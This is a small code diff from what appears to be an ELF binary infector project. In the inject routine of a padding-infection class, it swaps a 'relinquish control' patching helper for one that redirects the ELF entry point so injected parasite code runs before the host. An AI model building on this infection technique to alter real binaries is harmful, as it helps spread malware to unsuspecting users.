@@ -1,7 +1,7 @@
 #include "infector/padding_infect.hh"
 // patch arch specific jump code
 #include "common/patch_pattern.hh"
-#include "common/patch_relinguish_control.hh"
+#include "common/redirect_elf_entry_point.hh"
 #include "nostdlib/stdio.hh"
 #include "nostdlib/string.hh"
 
@@ -179,9 +179,9 @@ bool PaddingInfect::inject(
 
   // Patch parasite to resume host code after execution.
   const auto& ehdr = *reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  return patch_parasite_and_relinquish_control(
-      ehdr.e_type, original_entry_point, parasite_load_address_,
-      parasite_file_offset_, parasite_mapping.size(), host_mapping);
+  return redirect_elf_entry_point(ehdr.e_type, original_entry_point,
+                                  parasite_load_address_, parasite_file_offset_,
+                                  parasite_mapping.size(), host_mapping);
 }
 
 }  // namespace vt::infector
